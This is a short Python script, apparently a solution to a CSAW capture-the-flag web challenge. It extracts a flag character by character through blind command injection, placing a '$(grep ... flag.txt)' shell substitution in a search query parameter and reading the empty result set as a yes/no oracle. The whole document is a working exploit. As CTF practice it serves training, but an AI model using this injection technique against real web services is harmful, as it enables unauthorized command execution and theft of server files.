import requests
import sys
import urllib.parse
import string

password = ""

while True:
    for code in string.ascii_letters + string.digits + "{}_-":
        print(f"trying {password}{code}")
        # when grep finds a match output is "flag.txt:csawctf...", the query result will be empty
        # if there is no match output is empty, the results will be all lines
        params = urllib.parse.urlencode({"q": f"$(grep -H ^{password}{code} flag.txt)"})
        resp = requests.get(
            f"https://smolder-alexandria.ctf.csaw.io/vault/search?{params}"
        )
        if len(resp.json()["results"]) == 0:
            # when no results, then string matches since search query becomes "flag.txt:csawctf...."
            password += code
            if code == "}":
                print(password)
                sys.exit(0)
            continue
